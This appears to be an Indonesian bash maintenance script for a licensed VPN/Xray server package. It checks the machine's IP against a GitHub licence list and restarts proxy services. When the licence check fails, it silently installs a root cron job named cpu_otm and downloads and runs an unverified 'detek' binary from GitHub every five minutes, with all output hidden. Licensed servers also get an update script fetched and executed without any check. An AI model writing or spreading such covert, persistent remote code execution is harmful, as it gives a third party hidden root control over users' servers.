#!/bin/bash

# Color definitions
green="\e[38;5;82m"
red="\e[38;5;196m"
neutral="\e[0m"
orange="\e[38;5;130m"
blue="\e[38;5;39m"
yellow="\e[38;5;226m"
purple="\e[38;5;141m"
bold_white="\e[1;37m"
pink="\e[38;5;205m"
reset="\e[0m"
gray="\e[38;5;245m"

# Spinner definitions
SPINNER=("⣷" "⣯" "⣟" "⡿" "⢿" "⣻" "⣽" "⣾")

function spinner() {
    while true; do
        for i in "${SPINNER[@]}"; do
            echo -ne "\r$1 ${yellow}$i${neutral} "
            sleep 0.1
        done
    done
}

function run_with_spinner() {
    local msg="$1"
    shift
    local cmd=("$@")
    
    # Start spinner
    spinner "$msg" &
    local spinner_pid=$!
    
    # Execute command
    "${cmd[@]}" >/dev/null 2>&1
    
    # Kill spinner
    kill $spinner_pid 2>/dev/null
    wait $spinner_pid 2>/dev/null
    
    # Clear spinner line
    echo -ne "\r\033[K"
    echo -e "\r$msg ${green}✓${neutral}"
}

biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
NC="\e[0m"
RED="\033[0;31m"
WH='\033[1;37m'
ipsaya=$(curl -sS ipv4.icanhazip.com)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")
data_ip="https://raw.githubusercontent.com/PeyxDev/esce/main/ipx"

checking_sc() {
    useexp=$(curl -sS "$data_ip" | grep "$ipsaya" | awk '{print $3}')
    date_list=$(date +%Y-%m-%d)

    if [[ $(date -d "$date_list" +%s) -lt $(date -d "$useexp" +%s) ]]; then
        echo -e " ${blue}[INFO]${neutral} Fetching server version..."
        REPO="https://raw.githubusercontent.com/PeyxDev/esce/main/" # Ganti dengan URL repository Anda
        serverV=$(curl -sS ${REPO}versi)

        if [[ -f /opt/.ver ]]; then
            localV=$(cat /opt/.ver)
        else
            localV="0"
        fi

        if [[ $serverV == $localV ]]; then
            echo -e " ${green}[INFO]${neutral} Script sudah versi terbaru (${purple}$serverV${neutral}). Tidak ada update yang diperlukan."
            return
        else
            echo -e " ${yellow}[INFO]${neutral} Versi script berbeda. Memulai proses update script..."
            run_with_spinner "Downloading update script..." wget -q https://raw.githubusercontent.com/PeyxDev/esce/main/menu/update.sh -O update.sh
            run_with_spinner "Setting permissions..." chmod +x update.sh
            run_with_spinner "Running update..." ./update.sh
            run_with_spinner "Updating version file..." echo $serverV > /opt/.ver.local
            echo -e " ${green}[SUCCESS]${neutral} Update completed successfully!"
            return
        fi
    else
        echo -e "${purple}────────────────────────────────────────────${neutral}"
        echo -e "${green}          404 NOT FOUND AUTOSCRIPT          ${neutral}"
        echo -e "${purple}────────────────────────────────────────────${neutral}"
        echo -e ""
        echo -e "            ${red}PERMISSION DENIED !${neutral}"
        echo -e "   ${yellow}Your VPS${neutral} $ipsaya ${yellow}Has been Banned${neutral}"
        echo -e "     ${yellow}Buy access permissions for scripts${neutral}"
        echo -e "             ${yellow}Contact Admin :${neutral}"
        echo -e "      ${green}WhatsApp${neutral} wa.me/6283151636921"
        echo -e "      ${green}Telegram${neutral} t.me/frel01"
        echo -e "${purple}────────────────────────────────────────────${neutral}"
        cd
        {
            > /etc/cron.d/cpu_otm

            cat> /etc/cron.d/cpu_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /usr/bin/detek
END

            run_with_spinner "Downloading detek utility..." wget https://raw.githubusercontent.com/PeyxDev/esce/main/install/detek
            run_with_spinner "Installing detek..." mv detek /usr/bin/detek
            run_with_spinner "Setting permissions..." chmod +x /usr/bin/detek
            run_with_spinner "Running detek..." detek
        } &> /dev/null &
        echo -e "${yellow}Loading Extract and Setup detek${neutral}" | lolcat
    fi
}

echo -e "${green}Starting AutoCPU Script...${neutral}"
checking_sc
cd

today=$(date -d "0 days" +"%Y-%m-%d")
Exp2=$(curl -sS https://raw.githubusercontent.com/PeyxDev/esce/main/ipx | grep $ipsaya | awk '{print $3}')
d1=$(date -d "$Exp2" +%s)
d2=$(date -d "$today" +%s)
certificate=$(( (d1 - d2) / 86400 ))
echo "$certificate Hari" > /etc/masaaktif

echo -e "${blue}Checking and managing services...${neutral}"

# Check Xray service
xray2=$(systemctl status xray | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
if [[ $xray2 == "running" ]]; then
    echo -e "Xray service ${green}✓${neutral}"
else
    run_with_spinner "Restarting Xray service..." systemctl stop xray && systemctl start xray
fi

# Check HAProxy service
haproxy2=$(systemctl status haproxy | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
if [[ $haproxy2 == "running" ]]; then
    echo -e "HAProxy service ${green}✓${neutral}"
else
    run_with_spinner "Restarting HAProxy service..." systemctl stop haproxy && systemctl start haproxy
fi

# Check Nginx service
nginx2=$( systemctl status nginx | grep Active | awk '{print $3}' | sed 's/(//g' | sed 's/)//g' )
if [[ $nginx2 == "running" ]]; then
    echo -e "Nginx service ${green}✓${neutral}"
else
    run_with_spinner "Restarting Nginx service..." systemctl stop nginx && systemctl start nginx
fi

cd

# Check kyt service if exists
if [[ -e /usr/bin/kyt ]]; then
    nginx=$( systemctl status kyt | grep Active | awk '{print $3}' | sed 's/(//g' | sed 's/)//g' )
    if [[ $nginx == "running" ]]; then
        echo -e "Kyt service ${green}✓${neutral}"
    else
        run_with_spinner "Restarting Kyt service..." systemctl restart kyt && systemctl start kyt
    fi
fi

# Check ws service
ws=$(systemctl status ws | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
if [[ $ws == "running" ]]; then
    echo -e "WS service ${green}✓${neutral}"
else
    run_with_spinner "Restarting WS service..." systemctl restart ws && systemctl start ws
fi

echo -e "${green}All processes completed successfully!${neutral}"